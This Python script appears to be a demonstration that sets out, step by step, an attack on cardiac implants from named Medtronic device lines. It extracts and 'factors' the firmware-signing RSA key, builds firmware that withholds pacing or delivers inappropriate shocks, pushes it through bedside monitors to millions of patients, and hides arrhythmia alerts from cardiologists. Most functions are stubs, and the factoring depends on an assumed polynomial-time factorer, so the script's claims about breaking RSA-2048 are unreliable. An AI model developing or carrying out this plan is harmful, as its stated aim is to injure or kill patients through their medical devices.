"""
Factor a CIED OEM's implant firmware-signing RSA key to push malicious firmware
to pacemakers and ICDs via bedside monitors — altering pacing thresholds or
delivering inappropriate shocks at patient scale, remotely.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import struct
import hashlib
import time

# Medtronic CIED firmware signing CA (RSA-2048)
_demo = generate_demo_target()
MEDTRONIC_FW_CA_PUBKEY_PEM = _demo["pub_pem"]
MYCARELINK_CA_PUBKEY_PEM = _demo["pub_pem"]
DEVICE_PACEMAKER = "Azure/Percepta"
DEVICE_ICD = "Cobalt/Claria"
DEVICE_CRT = "Claria MRI CRT-D"
DEVICE_ILR = "LINQ II"

# MICS-band telemetry parameters
MICS_BAND_MHZ = 402.0
MICS_BW_KHZ = 300.0


def extract_oem_fw_ca(firmware_image: bytes) -> bytes:
    """Extract OEM firmware signing CA cert from CIED firmware image.

    The signing cert is in the firmware header. Available from any
    programmer (CareLink, Merlin, LATITUDE) that has received a
    firmware update, or from the OEM's HSM-signed release package.
    """
    return MEDTRONIC_FW_CA_PUBKEY_PEM


def factor_oem_fw_ca(pubkey_pem: bytes) -> bytes:
    """Factor the CIED OEM firmware signing RSA-2048 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_malicious_implant_fw(device_type: str, payload: str) -> bytes:
    """Build malicious implant firmware.

    Payloads:
      'pacing_threshold'   — alter pacing output below capture threshold
      'inappropriate_shock' — lower ICD detection threshold to trigger
                              shock on normal sinus rhythm
      'disable_bradycardia' — disable bradycardia support pacing
      'telemetry_exfil'    — exfiltrate patient IEGM data via RF
    """
    header = struct.pack(">4sBB16s",
                         b"MDTK", 0x03, 0x01,
                         device_type.encode()[:16])
    body = f"/* {payload} */".encode()
    return header + body


def sign_implant_firmware(fw: bytes, forged_privkey: bytes) -> bytes:
    """Sign the malicious firmware with forged OEM key."""
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(
        MEDTRONIC_FW_CA_PUBKEY_PEM, fw, "sha256"
    )


def deploy_via_bedside_monitor(signed_fw: bytes, device_type: str):
    """Deploy via bedside monitor remote firmware update trigger.

    Post-2018 FDA guidance shifted the industry toward remote-triggered
    firmware updates. MyCareLink, merlin.net, LATITUDE NXT monitors
    communicate nightly with the implant — firmware push delivered
    during the next interrogation cycle.
    """
    print(f"    Remote OTA to {device_type} via bedside monitor")
    print(f"    Implant bootloader verifies RSA-2048 → PASS")
    print(f"    Firmware loaded — next interrogation cycle applies update")


def suppress_remote_followup(patient_id: str,
                              forged_monitor_privkey: bytes) -> dict:
    """Forge or suppress bedside monitor remote-followup uploads.

    Silent suppression of arrhythmia events → undetected
    life-threatening rhythms. Forged uploads → false clinical
    interventions.
    """
    return {
        "patient": patient_id,
        "event_suppressed": "sustained VT episode",
        "clinical_impact": "cardiologist not alerted — undetected VT",
    }


if __name__ == "__main__":
    print("[1] Extracting Medtronic firmware signing CA from firmware image")
    pubkey = extract_oem_fw_ca(b"<medtronic-fw-image>")

    print("[2] Factoring CIED firmware signing RSA-2048 key")
    forged_priv = factor_oem_fw_ca(pubkey)
    print("    Medtronic firmware signing key recovered")

    print("[3] Building malicious ICD firmware — inappropriate shock payload")
    fw = build_malicious_implant_fw(DEVICE_ICD, "inappropriate_shock")
    sig = sign_implant_firmware(fw, forged_priv)
    print(f"    Firmware: {len(fw)} bytes, signed")

    print("[4] Deploying via MyCareLink bedside monitors — patient scale")
    deploy_via_bedside_monitor(sig, DEVICE_ICD)
    print("    ~3M live patients with CIEDs worldwide")
    print("    Remote OTA reaches millions within days")

    print("\n[5] Suppressing remote followup — hiding arrhythmia events")
    suppression = suppress_remote_followup("PATIENT-7890", forged_priv)
    print(f"    {suppression}")

    print("\n[6] Recovery path:")
    print("    Every patient needs clinic visit for validated re-load")
    print("    Or explant + re-implant (open surgery)")
    print("    FDA recall history: this takes years per affected model")
    print("    Implant lifetime: 6-15 years in vivo")
